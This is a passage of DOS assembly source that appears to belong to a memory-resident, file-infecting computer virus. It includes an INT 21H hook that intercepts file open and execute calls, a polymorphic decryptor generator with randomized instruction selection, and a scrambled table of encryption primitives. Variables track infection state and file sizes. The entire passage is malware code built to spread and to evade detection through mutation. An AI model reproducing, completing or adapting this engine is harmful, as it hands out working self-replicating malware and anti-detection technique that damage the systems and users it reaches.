        CLD
        MOVSB
        CLD
        LODSB
        OR AL,DL
        CLD
        STOSB
        XOR AX,AX
        MOV WORD PTR DS:[ADDSI],DI
        CLD
        STOSW
        CALL CALL_EM
        CALL RND
        TEST AL,1H
        JNE HEAD_E
        CLD
        LODSB
        OR AL,DL
        CLD
        STOSB
        CALL CALL_EM
        MOV AL,DS:[BX+3H]
        MOV DH,DL
        NEG DH
        INC DH
        OR AL,DH
        CLD
        STOSB
        JMP SHORT HEAD_E1
HEAD_E: INC SI
        CLD
        MOVSB
        CLD
        LODSB
        MOV CL,4H
        SHL AX,CL
        PUSH CX
        MOV CL,DL
        SHL AL,CL
        POP CX
        SHR AX,CL
        CLD
        STOSB
HEAD_E1:MOV BYTE PTR DS:[FORCE],YES
        CALL CALL_EM
        MOV WORD PTR DS:[DOFF],DI
        MOV WORD PTR DS:[DEC_START],DI
        RETN
CALL_EM:CALL Fill
        CALL PUTCL
        RETN
HEAD@:

HOP:    DB 0E8H         ;CALL
        DB 0FCH         ;CLD
        DB 0B9H         ;MOV CX,
        DB 5EH          ;POP SI 5FH = POP DI
        DB 81H          ;ADD 
        DB 0C6H         ;SI       C7H = DI
        DB 56H          ;PUSH SI  57H = PUSH DI
        DB 89H          ;MOV 
        DB 0F7H         ;DI,SI 0FEH = SI,DI
        DB 06H          ;PUSH ES
        DB 0EH          ;PUSH CS
        DB 1FH          ;POP DS
        DB 0EH          ;PUSH CS
        DB 07H          ;POP ES
HOP@:


PUTCL:  PUSH AX
        CALL RND
        CMP BYTE PTR DS:[FORCE],YES
        JE PUTCL_F
        TEST AL,01H
        JNE PUTCL_NO
PUTCL_F:CMP BYTE PTR DS:[PUTCLD],YES
        JE PUTCL_NO
        MOV AL,DS:[BX+1H]
        CLD
        STOSB
        CALL Fill
        MOV BYTE PTR DS:[PUTCLD],YES
PUTCL_NO:CALL RND
        CMP BYTE PTR DS:[FORCE],YES
        JE PUTCL_F1
        TEST AL,1H
        JNE PUTCL_NO1
PUTCL_F1:CMP BYTE PTR DS:[PUTCX],YES
        JE PUTCL_NO1
        MOV AL,DS:[BX+2H]
        CLD
        STOSB
        MOV WORD PTR DS:[MOVCX],DI
        XOR AX,AX
        CLD
        STOSW
        CALL Fill
        MOV BYTE PTR DS:[PUTCX],YES 
PUTCL_NO1:MOV BYTE PTR DS:[Begin],1EH
        CMP BYTE PTR DS:[Memory],YES
        JE PUTCL_MEM
        CMP BYTE PTR DS:[File],COM
        JE PutCLRet
PUTCL_MEM:MOV BYTE PTR DS:[Begin],90H
        CMP BYTE PTR DS:[PUSHED],YES
        JE PutCLRet
        PUSH CX
        PUSH SI
        MOV SI,OFFSET HOP+9H
        MOV CX,5H
        CMP BYTE PTR DS:[Memory],NO
        JE PUTCL_LP1
        INC SI
        DEC CX
PUTCL_LP1:CLD
        MOVSB
        CALL Fill
        LOOP PUTCL_LP1
        POP SI
        POP CX
        MOV BYTE PTR DS:[PUSHED],YES
PutCLRet:POP AX
        RETN
PUTCL@:

RanFunction:PUSH AX
        PUSH BX
        PUSH DI
        MOV DI,OFFSET FunctionComp+2H
        MOV BYTE PTR DS:[FuncByte],0H
RanFuncLP:CMP BYTE PTR DS:[FuncByte],0FH
        JE RanFuncEnd
        CALL RND
        AND AL,3H
        MOV AH,3DH
        MOV BL,1H
        CMP AL,0H
        JE GotFunc
        MOV AH,4BH
        MOV BL,2H
        CMP AL,1H
        JE GotFunc
        MOV AH,6CH
        MOV BL,4H
        CMP AL,2H
        JE GotFunc
        MOV AH,Signal
        MOV BL,8H
        CMP AL,3H
        JNE RanFuncLP
GotFunc:TEST BYTE PTR DS:[FuncByte],BL
        JNE RanFuncLP
        OR BYTE PTR DS:[FuncByte],BL
        MOV BYTE PTR DS:[DI],AH
        ADD DI,0005H
        JMP SHORT RanFuncLP
RanFuncEnd:POP DI
        POP BX
        POP AX
        RETN

MemHead:MOV BYTE PTR DS:[PUTCLD],NO
        MOV BYTE PTR DS:[PUTCX],NO
        MOV BYTE PTR DS:[FORCE],NO
        MOV BYTE PTR DS:[PUSHED],NO
        MOV BX,OFFSET HOP
        CALL RanFunction
        MOV DI,DS:[DOFF]
        MOV SI,OFFSET FunctionComp
        MOV CX,OFFSET MemDecrypt-FunctionComp
        MOV WORD PTR DS:[JumpHandle+1H],DI
        MOV WORD PTR DS:[JumpHandle+3H],CS
        MOV AX,DS:[Vector21]
        MOV WORD PTR DS:[FunctionJump+1H],AX
        MOV AX,DS:[Vector21+2H]
        MOV WORD PTR DS:[FunctionJump+3H],AX
        CALL Fill
        CLD
        REP MOVSB
        MOV SI,OFFSET MemBuild
        MOV CX,0009H
MemHeadLP:CALL Fill
        CLD
        MOVSB
        LOOP MemHeadLP
        CALL CALL_EM
        CALL RND        
        AND AL,01H
        MOV DL,AL
        MOV AL,0BEH
        OR AL,DL
        CLD
        STOSB
        MOV AX,100H
        CLD
        STOSW
        CALL CALL_EM
        MOV AL,89H
        CLD
        STOSB
        MOV AL,0F7H
        MOV CL,DL
        SHL CL,1
        SHL CL,1
        SHL AX,CL
        PUSH CX
        MOV CL,DL
        SHL AL,CL
        POP CX
        SHR AX,CL
        CLD
        STOSB
        MOV BYTE PTR DS:[Force],YES
        CALL CALL_EM
        MOV WORD PTR DS:[DOFF],DI
        MOV WORD PTR DS:[DEC_START],DI
        RETN

        
MemTail:MOV SI,OFFSET TOP
        MOV DI,DS:[DOFF]
        MOV CX,6H
        CALL RND
        TEST AL,1H
        JE MemNoADD
        ADD SI,CX
MemNoAdd:CLD
        REP MOVSB
        PUSH DI            
        CALL Fill
        MOV AL,0EAH
        CLD
        STOSB
        MOV AX,OFFSET Handle21Pall
        CLD
        STOSW
        MOV AX,CS
        CLD
        STOSW
        POP AX
        MOV BX,AX
        SUB AX,DS:[DEC_START]
        NEG AX
        MOV WORD PTR DS:[BX-2H],AX
        MOV WORD PTR DS:[DOFF],DI
        MOV BX,DS:[INST]
        SHL BX,1H
        XOR DX,DX
        MOV AX,OFFSET Done-OFFSET Start
        DIV BX
        INC AX
        MOV DI,DS:[MOVCX]
        MOV WORD PTR DS:[DI],AX
        MOV BX,AX
        MOV DI,DS:[EOFF]
        MOV SI,OFFSET MemEncrypt
        MOV CX,OFFSET MemEncrypt@-OFFSET MemEncrypt
        MOV AX,DI
        CLD
        REP MOVSB
        MOV CX,BX
        CMP BYTE PTR DS:[ReturnFar],YES
        JE NoPush
        SUB DI,5H
        PUSH AX
        MOV AL,0EAH
        CLD
        STOSB
        MOV AX,DS:[Vector21]
        CLD
        STOSW
        MOV AX,DS:[Vector21+2H]
        CLD
        STOSW
        POP AX
NoPush: MOV BYTE PTR DS:[Busy_Flag],No
        MOV SI,100H
        MOV DI,SI
        INC AX
        JMP AX

MemEncrypt:RETN
MemLoop:MOV AX,OFFSET Encrypt
        CALL AX
        LOOP MemLoop
        XOR AX,AX
        POP ES
        POP DS
        POP BP
        POP SI
        POP DI
        POP DX
        POP CX
        POP BX
        POP AX
        RETF 0002H
        DB 0H,0H
MemEncrypt@:



FunctionComp:CMP AH,3DH
        JE MemDecrypt
        CMP AH,4BH
        JE MemDecrypt
        CMP AH,6CH
        JE MemDecrypt
        CMP AH,Signal
        JE MemDecrypt
FunctionJump:DB 0EAH,00H,00H,00H,00H
MemDecrypt:


LODSTO  DB 0ADH,0ABH
LODSTO@:

;   These instructions can be changed if you follow the formating
;    protocal

;   Example:    E1:    DB 00100100B                 ;2,I,N,W
;               ADD WORD PTR DS:[SI],CX
;               SUB WORD PTR DS:[SI],CX
;
;               This would change E1 so that it would add/sub the counter 
;                regs to every word encrypted
;
;

ETAB:   DW OFFSET E1-OFFSET ETAB,OFFSET E2-OFFSET ETAB,OFFSET E3-OFFSET ETAB,OFFSET E4-OFFSET ETAB,OFFSET E5-OFFSET ETAB
        DW OFFSET E6-OFFSET ETAB,OFFSET E7-OFFSET ETAB,OFFSET E8-OFFSET ETAB,OFFSET E9-OFFSET ETAB,OFFSET E10-OFFSET ETAB,OFFSET E11-OFFSET ETAB
        DW OFFSET E12-OFFSET ETAB,OFFSET E13-OFFSET ETAB,OFFSET E14-OFFSET ETAB,OFFSET E15-OFFSET ETAB,OFFSET E16-OFFSET ETAB,OFFSET E17-OFFSET ETAB
        DW OFFSET E18-OFFSET ETAB,OFFSET E19-OFFSET ETAB,OFFSET E20-OFFSET ETAB,OFFSET E21-OFFSET ETAB,OFFSET E22-OFFSET ETAB,OFFSET E23-OFFSET ETAB
        DW OFFSET E24-OFFSET ETAB,OFFSET E25-OFFSET ETAB,OFFSET E26-OFFSET ETAB,OFFSET E27-OFFSET ETAB,OFFSET E28-OFFSET ETAB,OFFSET E29-OFFSET ETAB
        DW OFFSET E30-OFFSET ETAB,OFFSET E31-OFFSET ETAB,OFFSET E32-OFFSET ETAB
        ;xxxxyyyy = xxxx EQUALS SIZE OF INSTRUCTION
        ;0xxx = INDIRECT  1xxx = LODSW
        ;x0xx = ADD       x1xx = NO ADD
        ;xx0x = WORD      xx1x = BYTE (ONLY COUNTS IF ADD BIT IS ZERO)
        ;xxx0 = [SI]      xxx1 = [SI+1H]
E1:     DB 01000000B                 ;4,I,A,W
        ADD WORD PTR DS:[SI],1234H
        SUB WORD PTR DS:[SI],1234H
E2:     DB 00110010B                 ;3,I,A,B
        ADD BYTE PTR DS:[SI],12H
        SUB BYTE PTR DS:[SI],12H
E3:     DB 01000011B                 ;4,I,A,B
        ADD BYTE PTR DS:[SI+1H],12H
        SUB BYTE PTR DS:[SI+1H],12H
E4:     DB 00100100B                 ;2,I,N
        ROR WORD PTR DS:[SI],CL
        ROL WORD PTR DS:[SI],CL
E5:     DB 00100100B                 ;2,I,N
        ROR BYTE PTR DS:[SI],CL 
        ROL BYTE PTR DS:[SI],CL
E6:     DB 00110101B                 ;3,I,N
        ROR BYTE PTR DS:[SI+1H],CL
        ROL BYTE PTR DS:[SI+1H],CL
E7:     DB 00100100B                 ;2,I,N
        NOT WORD PTR DS:[SI]
        NOT WORD PTR DS:[SI]
E8:     DB 00100100B                 ;2,I,N
        NOT BYTE PTR DS:[SI]
        NOT BYTE PTR DS:[SI]
E9:     DB 00110101B                 ;3,I,N
        NOT BYTE PTR DS:[SI+1H] 
        NOT BYTE PTR DS:[SI+1H]
E10:    DB 01000000B                 ;4,I,A,W   
        XOR WORD PTR DS:[SI],1234H
        XOR WORD PTR DS:[SI],1234H
E11:    DB 00110010B                 ;3,I,A,B
        XOR BYTE PTR DS:[SI],12H
        XOR BYTE PTR DS:[SI],12H        
E12:    DB 01000011B                 ;4,I,A,B   
        XOR BYTE PTR DS:[SI+1H],12
        XOR BYTE PTR DS:[SI+1H],12      
E13:    DB 00100100B                 ;2,I,N
        NEG WORD PTR DS:[SI]
        NEG WORD PTR DS:[SI]
E14:    DB 00100100B                 ;2,I,N   
        NEG BYTE PTR DS:[SI]    
        NEG BYTE PTR DS:[SI]
E15:    DB 00110101B                 ;3,I,N   
        NEG BYTE PTR DS:[SI+1H]
        NEG BYTE PTR DS:[SI+1H]
E16:    DB 00111000B                 ;3,L,A,W
        ADD AX,1234H
        SUB AX,1234H
E17:    DB 00111010B                 ;3,L,A,B
        ADD AH,12H
        SUB AH,12H
E18:    DB 00101010B                 ;2,L,A,B
        ADD AL,12H
        SUB AL,12H
E19:    DB 00111000B                 ;3,L,A,W   
        XOR AX,1234H
        XOR AX,1234H
E20:    DB 00101010B                 ;2,L,A,B
        XOR AL,12H
        XOR AL,12H
E21:    DB 00111010B                 ;2,L,N
        XOR AH,12H
        XOR AH,12H
E22:    DB 00101100B                 ;2,L,N   
        XOR AX,CX
        XOR AX,CX
E23:    DB 00101100B                 ;2,L,N
        XCHG AL,AH
        XCHG AL,AH
E24:    DB 00101100B                 ;2,L,N   
        NOT AX
        NOT AX
E25:    DB 00101100B                 ;2,L,N
        NOT AL
        NOT AL
E26:    DB 00101100B                 ;2,L,N
        NOT AH
        NOT AH
E27:    DB 00101100B                 ;2,L,N
        NEG AX
        NEG AX
E28:    DB 00101100B                 ;2,L,N   
        NEG AH
        NEG AH
E29:    DB 00101100B                 ;2,L,N 
        NEG AL
        NEG AL
E30:    DB 00101100B
        ROR AX,CL
        ROL AX,CL
E31:    DB 00101100B
        ROR AL,CL
        ROL AL,CL
E32:    DB 00101100B
        ROR AH,CL
        ROL AH,CL
ETAB@:

ALTTAB: MOV CX,7FH              ;Scramble Encryption table
ALTTABL:MOV DI,OFFSET ETAB
        MOV SI,DI
        CALL RND
        AND AX,1FH
        SHL AX,1H
        ADD DI,AX
        CALL RND
        AND AX,1FH
        SHL AX,1H
        ADD SI,AX
        CMP SI,DI
        JE ALTTABL
        MOV AX,DS:[SI]
        XCHG AX,DS:[DI]
        MOV WORD PTR DS:[SI],AX
        LOOP ALTTABL
        RETN
        DB ?
ALTTAB@:
Done:   DB ?


EOFF            DW ?
DOFF            DW ?
ADDSI           DW ?
SIZ             DW ?
MOVCX           DW ?
ECNT            DW ?
INST            DW ?
CALL_OFF        DW ?
DEC_START       DW ?
WRITE_BYTE      DB ?
PATH_END        DB ?
FillB           DB ?
FORCE           DB ?
PUTCLD          DB ?
PUTCX           DB ?
PUSHED          DB ?

Vector21        DD ?            ;Segment:Offset of INT 21H
DTA             DD ?            ;Segment:Offset of DTA
FileSeg         DD ?            ;Segment:Offset of file
FileDS          DW ?            ;Original Data Segment
AddSeg          DW ?
OldFileSize     DD ?
NewFileSize     DD ?
Infected        DB ?
Opened          DB ?
Attribute       DB ?
Memory          DB ?
ReturnFar       DB ?
FuncByte        DB ?
Busy_Flag       DB ?

MemDelete:
ImmuneBytes     DB 20H DUP(0)

First20         DB 20H DUP(0)

NewDTA          DB 128 DUP(0)

ENCRYPT:        DB 512 DUP(0)

JumpHandle      DB 5 DUP(0)             ;JMP CS:Handle21
 
DECRYPT         DB 0H

Vend:
CSEG ENDS
     END Start      

